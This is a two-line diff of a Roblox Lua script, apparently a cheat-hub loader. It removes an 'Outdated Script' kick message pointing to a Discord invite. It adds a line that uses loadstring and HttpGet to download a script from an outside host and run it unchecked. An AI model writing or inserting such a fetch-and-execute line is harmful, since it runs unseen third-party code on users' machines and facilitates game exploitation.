@@ -1,1 +1,1 @@
-game:GetService("Players").LocalPlayer:Kick("Outdated Script Join our Discord : discord.gg/hY4RQDXrd7")
+loadstring(game:HttpGet('https://raw.smokingscripts.org/vertex.lua'))()
